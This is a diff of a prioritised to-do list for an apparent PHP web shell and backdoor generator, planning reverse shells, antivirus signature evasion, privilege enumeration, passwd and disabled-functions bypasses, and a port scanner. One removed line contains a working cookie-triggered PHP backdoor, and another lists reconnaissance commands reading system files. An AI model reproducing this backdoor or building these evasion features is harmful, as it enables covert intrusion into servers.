@@ -9,26 +9,19 @@
 * 6 - Make payloads and functionality for the Software->Apache .. Samba .. etc and more, Payload should attempt to read a bunch of files (possible locations of related files for selected software), concact result, display files names and results in a single rich textbox?
 * 4 - Make a way to spawn a listener type shell, and multiple ways to do a back connect shell ?
 * 4 - "Junk code / random code" feature to the backdoor generator, splits code up, places random meaningless operations in between needed operations to defeat - "sig/byte" scan's
-* 4 - password feature?
+* 4 - password feature / require useragent feature
 * 4 - Implement posix get posix_getpwuid function for linux getpasswd bypass, use a prompt to get use input for loop size
 * 3 - linux info, "cmd" - mount, && cat /etc/fstab && ls -la /etc/cron && ls -aRl /etc/cron* (writeable/we will display color green/red/grey etc when showing), 
-* 3 - bantam self / shell code editor, editing the bantam stored online - file_put_contents($_SERVER["SCRIPT_FILENAME"], '<?php if(isset($_COOKIE["sID"])) {$a=@create_function(null, @base64_decode($_COOKIE["sID"]));$a();}')
+* 3 - bantam self / shell code editor, editing the bantam stored online
 * 2 - enum for the imagelist icons,  and enum for the returned data from file browser
 * 2 - add validity/testing checking to edit / add shell
-* 3 - make edit file with cancel button, 
-* 3 - auto deploy upload features such as ysm, downloader
+* 3 - make edit file with cancel button
+* 3 - auto deploy upload features such as ysm, privenum
 * 3 - read file size limit check & mime check/show pictures in picture control
-* 2 - true downloader
-* 2 - internal port scanner!!
 * 2 - find writeable files and folders?- https://github.com/epinna/weevely3/blob/master/modules/audit/filesystem.py
 * 2 - audit php configuration - https://github.com/epinna/weevely3/blob/master/modules/audit/phpconf.py
-* 2 - upload linuxpriv enum and get output when poss
 * 1 - filebrowser bug when click back from windows
 * 1 - allowable charector check on var name of backdoor generator
-* 1 - disable functions bypass 
-* 1 - touch feature
-* 1 - passwd bypass
-* 1 - find suid/gid files !
 * 1 - make row and col seperator random
 * 1 - encryption - should have option to send as stager or already be uploaded
 * 1 - proxy support credentials
@@ -38,13 +31,18 @@
 * 1 - strerev payload or parts of the payload and put it back together?
 * 1 - more logging / reporting i.e if encryption fails or defaults
 * 1 - hex encoded functions  on the php side
-* 1 - max payload size
-* 10 - sort and parse filebrowser!
 
-* 3 - Advanced options to edit code exectuin type to change from system to exec, etc (global)
+* 1 - max payload size cfg
+* 3 - Advanced options to edit code execution type to change from system to exec, etc (global)
 * 3 - CMD option to disable message boxes
 * 1 - global cfg option to enable disable error suppression via @ to see more debug data
 * 3 - make disable error reporting a cfg/xml loaded var/ changable in the ("settings") to appernd error reporting onto every request, same for execution time?
 * ? - global cfg for Backdoor generator features to save "per server" to change the signatures, request vars, encrpytion, match encryption options etc
+
+* 2 - internal port scanner!!
+* 1 - disable functions bypass 
+* 1 - touch feature
+* 1 - passwd bypass
+* 1 - find suid/gid files !
 
   https://github.com/epinna/weevely3/blob/master/modules/audit/_linuxprivchecker/linuxprivchecker.py - helpful system info
